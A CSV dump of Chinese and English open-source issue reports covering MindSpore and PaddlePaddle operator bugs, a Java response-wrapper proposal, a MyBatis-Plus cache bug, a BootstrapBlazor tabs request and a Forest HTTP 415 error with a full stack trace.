title,text
建议所有响应R的格式调整,"建议R的格式调整为 固定code msg data三个字段， 因为这样调你接口的获取你的数据，不用知道你的data 的key是哪个 例如 public class Response implements Serializable { /** * 响应业务状态 0 成功， 1失败 */ private Integer code; }   <code>: /** * 响应消息 */ private String msg; /** * 响应中的数据 */ private transient T data; private Response() { } public Response(int code, String msg) { this.code = code; this.msg = msg; } public static Response init(BaseCode respCode, String msg) { Response response = new Response(); response.setCode(respCode.getCode()); response.setMsg(msg); return response; } public static &lt;T&gt; Response init(BaseCode respCode, String msg, T data) { Response response = new Response(); response.setCode(respCode.getCode()); response.setMsg(msg); response.setData(data); return response; } public static &lt;T&gt; Response init(int code, String msg, T data) { Response response = new Response(); response.setCode(code); response.setMsg(msg); response.setData(data); return response; } public Response success() { return init(BaseCode.SUCCESS, BaseCode.SUCCESS.getMsg()); } public static Response success(Object data) { return init(BaseCode.SUCCESS, BaseCode.SUCCESS.getMsg(), data); } public static Response success(Object data, String msg) { return init(BaseCode.SUCCESS, msg, data); } public static Response fail(BaseCode respCode, String msg) { return init(respCode, msg); } public static Response fail() { return init(BaseCode.FAILD, BaseCode.FAILD.getMsg()); } public static Response fail(String msg) { return init(BaseCode.FAILD, msg); } public static boolean isSuccess(Response response) { return BaseCode.SUCCESS.getCode() == response.getCode(); }"
【众智】【计算-TBE接入】ExtractVolumePatches,提取立体中的一块数据，是extract_image_patches的3D格式扩展。 kernel_size tuple/int 属性 strides tuple/int 属性 padding str 属性 input_x output 对应底层算子 对应底层AI Core算子ExtractVolumePatches：   <code>: class ExtractVolumePatches(Primitive):
Send more infos to akg when compiling with json,"Task Description 在akg的接口加一个参数，用于传递算子编译的控制选项。 Task Goal 尽可能将算子的编译选项放在图层上控制 Sub Task No. Task Description 1 切分知识库路径：通过attr传递给composite层，并配置自定义知识库（优先于环境变量） 2 在线tuning： 通过attr传递给composite层。如果使能，则自动tuning 3 compute capability（GPU ONLY）：默认通过获取, 并通过info传递给composite，并设置attr给poly等供poly实现不同gpu架构的针对性优化。 Analysis task1目的是把知识库配置统一收归到图层，以后可以将知识库放到model_zoo的网络目录里面 akg已经支持参数，图层传个开关下去就能使能了。 capability需要放在算子info里（与""processor""并列），方便算子做架构特定优化   <code>: compilewithjson attrs MS_GRAPH_KERNEL_TILING cuDeviceGetAttribute ""online_tuning"""
"[CT][MS][op] the op with ArgMaxWithValue don't support tuple, tips is error",": Uncomment only one line, hit enter to put that in a new line, and remove leading whitespaces from that line: /device ascend : -- MindSpore version :ME+VM -- Python version : -- OS platform and distribution : -- GCC/Compiler version : pytest -s test_argmaxwithvalue.py::test_argmaxwithvalue_input_256x2000_axis_0_keepdims_false ArgMaxWithValue axis dont support tuple,but log support ArgMaxWithValue axis dont support tuple,log also not support   <code>: def test_argmaxwithvalue_input_256x2000_axis_str_keepdims_false(): fact = ArgMaxWithValueFactory(input_shape=[256, 2000], axis='1', keep_dims=False) fact.forward_cmp() ../share/ops/argmaxwithvalue_ops.py:69: in forward_cmp out_mindspore = self.forward_mindspore_impl() ../share/ops/argmaxwithvalue_ops.py:40: in forward_mindspore_impl net = ArgMaxWithValue(axis=self.axis, keep_dims=self.keep_dims) ../share/utils.py:57: in __init__ super().__init__(*args, **kwargs) ../share/ops/argmaxwithvalue_ops.py:16: in __init__ self.op = op.ArgMaxWithValue(axis='1', keep_dims=keep_dims) /root/archiconda3/envs/liwuxia_vm/lib/python3.7/site-packages/mindspore/ops/primitive.py:313: in deco fn(self, *args, **kwargs) /root/archiconda3/envs/liwuxia_vm/lib/python3.7/site-packages/mindspore/ops/operations/array_ops.py:1188: in __init__ _check_infer_attr_reduce(axis, keep_dims, self.name) /root/archiconda3/envs/liwuxia_vm/lib/python3.7/site-packages/mindspore/ops/operations/array_ops.py:89: in _check_infer_attr_reduce validator.check_value_type('axis', axis, [int, tuple], prim_name) /root/archiconda3/envs/liwuxia_vm/lib/python3.7/site-packages/mindspore/_checkparam.py:292: in check_value_type raise_error_msg() _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ def raise_error_msg(): """"""func for raising error message when check failed"""""" type_names = [t.__name__ for t in valid_types] num_types = len(valid_types) msg_prefix = f'For \'{prim_name}\' the' if prim_name else 'The' &gt; raise TypeError(f'{msg_prefix} type of `{arg_name}` should be {""one of "" if num_types &gt; 1 else """"}' f'{type_names if num_types &gt; 1 else type_names[0]}, but got {type(arg_value).__name__}.') E TypeError: For 'ArgMaxWithValue' the type of `axis` should be one of ['int', 'tuple'], but got str. /root/archiconda3/envs/liwuxia_vm/lib/python3.7/site-packages/mindspore/_checkparam.py:283: TypeError"
"[CT][MS][Probability]Uniform, kl_loss, cross_entropy AssertionError with tensorflow",": /device ascend : -- MindSpore version : 0.6.0 -- Python version : 3.7.5 -- OS platform and distribution : eulerosv2r8.aarch64 -- GCC/Compiler version : 7.3.0 pytest -s test_1.py::test_uniform_kl_loss_010 pass   <code>: ''' TEST_SUMMARY: uniform low = 0.0, high = 1.0, kl_loss dist=Uniform, low_b=0.2, high_b=2.0, low_a=0.4, high_a = 0.9 ''' def test_uniform_kl_loss_005(): class Net(NetKLLoss): def construct(self, low_b, high_b, low_a, high_a): return self.uniform.kl_loss(self.dist, low_b, high_b, low_a=low_a, high_a=high_a) low_b = 0.2 high_b = 2.0 low_a = 0.4 high_a = 0.9 net = Net() out_ms = net(Tensor(low_b, dtype=dtype.float32), Tensor(high_b, dtype=dtype.float32),Tensor(low_a, dtype=dtype.float32), Tensor(high_a, dtype=dtype.float32)) p = tfd.Uniform(low=low_b, high=high_b) q = tfd.Uniform(low=low_a, high=high_a) out = q.kl_divergence(p) with tf.Session() as sess: out_tf = sess.run(out) allclose_nparray(out_tf, out_ms.asnumpy(), 1e-4, 1e-4) ______________________________________________________________________________ test_uniform_kl_loss_005 ______________________________________________________________________________ @Author(""zwx5320437"") @Level3 def test_uniform_kl_loss_005(): class Net(NetKLLoss): def construct(self, low_b, high_b, low_a, high_a): return self.uniform.kl_loss(self.dist, low_b, high_b, low_a=low_a, high_a=high_a) low_b = 0.2 high_b = 2.0 low_a = 0.4 high_a = 0.9 net = Net() out_ms = net(Tensor(low_b, dtype=dtype.float32), Tensor(high_b, dtype=dtype.float32),Tensor(low_a, dtype=dtype.float32), Tensor(high_a, dtype=dtype.float32)) p = tfd.Uniform(low=low_b, high=high_b) q = tfd.Uniform(low=low_a, high=high_a) out = q.kl_divergence(p) with tf.Session() as sess: out_tf = sess.run(out) &gt; allclose_nparray(out_tf, out_ms.asnumpy(), 1e-4, 1e-4) test_1.py:1666: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/utils.py:22: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = 1.2809339, data_me = array(-0.8479968, dtype=float32), rtol = 0.0001, atol = 0.0001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me)*rtol) loss_count = np.count_nonzero(greater) assert (loss_count/total_count) &lt; rtol,\ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"".\ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[1.2809339] E data_me_error:[-0.8479968] E loss:[2.1289306] ../share/utils.py:15: AssertionError"
批量插入不刷新缓存,当前使用版本 3.1.0 批量插入不刷新缓存，二级缓存设置false关闭也不行 同一个事务中先查询，然后批量插入，然后再查询，第二次查询sql不执行（log中没有打印）。 临时解决办法   <code>: SqlSession sqlSession = SqlHelper.sqlSession(Entity.class); sqlSession.clearCache();
Add ProgramDesc as an argument to Operator::Run,"Problem We have OPs (recurrent op, while op, parallel do op, conditional block op, recv op) that needs BlockDesc or ProgramDesc inside Operator::Run. Because currently Operator::Run does not take ProgramDesc as an argument, we serialize them into attributes, and deserialize during run. It has several issues: Hard to debug the ProgramDesc: the attribute is a binary string, we do not understand it when printing it out. Also Python will raise exception when parsing the message, because currently serialized ProgramDesc and BlockDesc is saved as , and Python parsing only support utf8 strings. Related issue: https://github.com/PaddlePaddle/Paddle/issues/7343 https://github.com/PaddlePaddle/Paddle/issues/7419 The following code shows up in many places in our codebase: From my understanding its a workaround to the fact that Operator::Run does not take ProgramDesc as an argument. Otherwise we could use the index of the BlockDesc in the ProgramDesc as an attribute. Solution Given some of our OP need ProgramDesc in run, one solution is to pass it as an argument of Operator::Run. I would oppose to this solution if OP does not use executor to run ProgramDesc. Currently OP can run program, I think it's reasonable to let OP know the ProgramDesc that it runs in.   <code>: print(program.to_string(True)) proto::string proto::string auto *block = Attr&lt;framework::BlockDesc *&gt;(kStepBlock); auto *program = block-&gt;Program();"
Layout 设置 UseTabSet=“true” 时能不能暴露Tabs的IsOnlyRenderActiveTab属性？,有时需要Tabs切换页面时直接刷新页面，不想保持原有的状态，能否把IsOnlyRenderActiveTab属性暴露出来可以在 Layout 属性中进行设置？ 目前的Tabs 模式下 一个页面单独写的 html css样式切换到其他页面时有也会生效。 我在【平台列表】razor页面中添加了css样式，在【用户管理】razor页面中没有添加，来回切换tabs页面时，会相互影响，看下图   <code>: .float-start { float: right !important; margin-left: .3125rem }
激活函数遇到nan时应该输出nan,"PaddlePaddle Version: 2.0.0-rc1 CPU/GPU: CUDA 10.2; cuDNN: 7.4 系统：Linux ubuntu 4.4.0-131-generic #157:Will you provide the matlab API?-Ubuntu SMP Thu Jul 12 15:51:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 复现：下面是Paddle的代码： 输出是： 下面是Torch的代码(version: 1.6.0)： 输出是 我在训练的过程中不知道为什么模型的参数变成了nan，但输出的预测值不是nan，这样很难让人发现中间出错了。   <code>: import paddle import numpy as np x = paddle.to_tensor([ [-1. ,np.nan], [np.nan, 15.6] ]) out = paddle.nn.ELU()(x) print(out) Tensor(shape=[2, 2], dtype=float32, place=CUDAPlace(0), stop_gradient=True, [[-0.63212055, 0. ], [ 0. , 15.60000038]]) import torch as t import numpy as np x = t.tensor([ [-1. ,np.nan], [np.nan, 15.6] ]) out = torch.nn. ELU()( x ) print(out) tensor([[-0.6321, nan], [ nan, 15.6000]])"
@BodyType指定json请求体远程调用报错,"Forest: version Backend: (okhttp或httpclient)/version 该问题是如何引起的？ @BodyType 指定json格式请求体，远程调用http://localhost:8020/api/v1/user插入用户方法，报错 说是类型转换问题 报错信息/完整请求日志（如果没有请求日志请把开关打开） { ""timestamp"": ""2022-03-24T05:30:43.002+00:00"", ""status"": 500, ""error"": ""Internal Server Error"", ""trace"": ""com.dtflys.forest.exceptions.ForestNetworkException: HTTP 415 ErrorContent={""timestamp"":""2022-03-24T05:30:42.985+00:00"",""status"":415,""error"":""Unsupported Media Type"",""path"":""/api/v1/user""}\r\n\tat com.dtflys.forest.reflection.MethodLifeCycleHandler.handleError(MethodLifeCycleHandler.java:136)\r\n\tat com.dtflys.forest.reflection.MethodLifeCycleHandler.handleSyncWithException(MethodLifeCycleHandler.java:66)\r\n\tat com.dtflys.forest.reflection.MethodLifeCycleHandler.handleSync(MethodLifeCycleHandler.java:51)\r\n\tat com.dtflys.forest.backend.ResponseHandler.handleSync(ResponseHandler.java:39)\r\n\tat com.dtflys.forest.backend.okhttp3.response.OkHttp3ResponseHandler.handleSync(OkHttp3ResponseHandler.java:29)\r\n\tat com.dtflys.forest.backend.okhttp3.executor.OkHttp3Executor.retryOrDoError(OkHttp3Executor.java:253)\r\n\tat com.dtflys.forest.backend.okhttp3.executor.OkHttp3Executor.execute(OkHttp3Executor.java:230)\r\n\tat com.dtflys.forest.backend.okhttp3.executor.OkHttp3Executor.execute(OkHttp3Executor.java:224)\r\n\tat com.dtflys.forest.backend.okhttp3.executor.OkHttp3Executor.execute(OkHttp3Executor.java:224)\r\n\tat com.dtflys.forest.backend.okhttp3.executor.OkHttp3Executor.execute(OkHttp3Executor.java:224)\r\n\tat com.dtflys.forest.backend.okhttp3.executor.OkHttp3Executor.execute(OkHttp3Executor.java:266)\r\n\tat com.dtflys.forest.http.ForestRequest.execute(ForestRequest.java:4077)\r\n\tat com.dtflys.forest.http.ForestRequest.execute(ForestRequest.java:4111)\r\n\tat com.dtflys.forest.reflection.ForestMethod.invoke(ForestMethod.java:1414)\r\n\tat com.dtflys.forest.proxy.InterfaceProxyHandler.invoke(InterfaceProxyHandler.java:215)\r\n\tat com.sun.proxy.$Proxy91.bodyTypeJson(Unknown Source)\r\n\tat com.ediansoft.forest.controller.ForestController.bodyTypeJson(ForestController.java:95)\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\r\n\tat java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n\tat java.base/java.lang.reflect.Method.invoke(Method.java:566)\r\n\tat org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205)\r\n\tat org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:150)\r\n\tat org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:117)\r\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895)\r\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808)\r\n\tat org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87)\r\n\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1067)\r\n\tat org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963)\r\n\tat org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006)\r\n\tat org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909)\r\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:517)\r\n\tat org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883)\r\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:584)\r\n\tat io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74)\r\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129)\r\n\tat org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117)\r\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\r\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\r\n\tat org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117)\r\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\r\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\r\n\tat org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:96)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117)\r\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\r\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\r\n\tat org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117)\r\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\r\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\r\n\tat io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84)\r\n\tat io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62)\r\n\tat io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68)\r\n\tat io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36)\r\n\tat io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68)\r\n\tat io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:117)\r\n\tat io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57)\r\n\tat io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43)\r\n\tat io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46)\r\n\tat io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64)\r\n\tat io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60)\r\n\tat io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77)\r\n\tat io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43)\r\n\tat io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43)\r\n\tat io.undertow.servlet.handlers.SendErrorPageHandler.handleRequest(SendErrorPageHandler.java:52)\r\n\tat io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43)\r\n\tat io.undertow.servlet.handlers.SessionRestoringHandler.handleRequest(SessionRestoringHandler.java:119)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:275)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:79)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:134)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:131)\r\n\tat io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48)\r\n\tat io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:255)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:79)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:100)\r\n\tat io.undertow.server.Connectors.executeRootHandler(Connectors.java:387)\r\n\tat io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:852)\r\n\tat org.jboss.threads.ContextClassLoaderSavingRunnable.run(ContextClassLoaderSavingRunnable.java:35)\r\n\tat org.jboss.threads.EnhancedQueueExecutor.safeRun(EnhancedQueueExecutor.java:2019)\r\n\tat org.jboss.threads.EnhancedQueueExecutor$ThreadBody.doRunTask(EnhancedQueueExecutor.java:1558)\r\n\tat org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1423)\r\n\tat org.xnio.XnioWorker$WorkerThreadFactory$1$1.run(XnioWorker.java:1280)\r\n\tat java.base/java.lang.Thread.run(Thread.java:834)\r\n"", ""message"": ""Request processing failed; nested exception is com.dtflys.forest.exceptions.ForestNetworkException: HTTP 415 ErrorContent={""timestamp"":""2022-03-24T05:30:42.985+00:00"",""status"":415,""error"":""Unsupported Media Type"",""path"":""/api/v1/user""}"", ""path"": ""/forest/bodyTypeJson"" } 接口定义（必要时请提供）   <code>: /** * @BodyType 不设置 Content-Type, 也可以指定 JSON 格式请求体，优先级高于Content-Type */ @BodyType(""json"") @Post(url = ""/api/v1/user"") List&lt;User&gt; bodyTypeJson(@Body(""id"") Integer id, @Body(""name"") String name, @Body(""age"") Integer age); /** * 插入用户 * http://localhost:8020/api/v1/user */ @PostMapping public ResponseBean&lt;String&gt; save(@RequestBody User user) { String userStr = JSON.toJSONString(user); log.info(""RestFulController save ------------------"" + userStr); return new ResponseBean&lt;&gt;(200); }"
